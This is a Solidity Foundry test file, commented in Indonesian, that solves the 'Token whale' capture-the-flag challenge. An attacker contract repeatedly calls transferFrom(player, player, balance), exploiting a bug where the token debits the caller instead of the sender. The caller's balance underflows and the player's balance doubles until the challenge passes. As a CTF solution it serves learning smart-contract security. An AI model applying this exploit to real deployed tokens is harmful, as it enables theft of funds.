// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {TokenWhale} from "src/TokenWhale.sol";

// #7 Token whale — `_transfer` mendebit `msg.sender`, BUKAN `from`.
// transferFrom(player, player, v) dengan allowance dari player:
// cek lolos (balance player >= v, allowance >= v), tapi yang
// didebit adalah CALLER (attacker, saldo 0 -> underflow unchecked),
// yang dikredit adalah player. Ulangi dengan v = saldo player:
// saldo player berlipat ganda tiap iterasi (1000 -> 1.024.000).
contract TokenWhaleAttacker {
    TokenWhale public token;

    constructor(TokenWhale _token) {
        token = _token;
    }

    function attack(address player, uint256 value) external {
        token.transferFrom(player, player, value);
    }
}

contract TokenWhaleSolve is Test {
    TokenWhale challenge;
    TokenWhaleAttacker attacker;
    address player = address(0xBEEF);

    function setUp() public {
        challenge = new TokenWhale(player);
        attacker = new TokenWhaleAttacker(challenge);
    }

    function testInit() public view {
        assertFalse(challenge.isComplete());
        assertEq(challenge.balanceOf(player), 1000);
    }

    function testSolve() public {
        for (uint256 i = 0; i < 20; i++) {
            if (challenge.isComplete()) break;
            uint256 bal = challenge.balanceOf(player);
            vm.prank(player);
            challenge.approve(address(attacker), bal);
            attacker.attack(player, bal);
        }
        assertTrue(challenge.isComplete());
        assertGe(challenge.balanceOf(player), 1000000);
    }
}
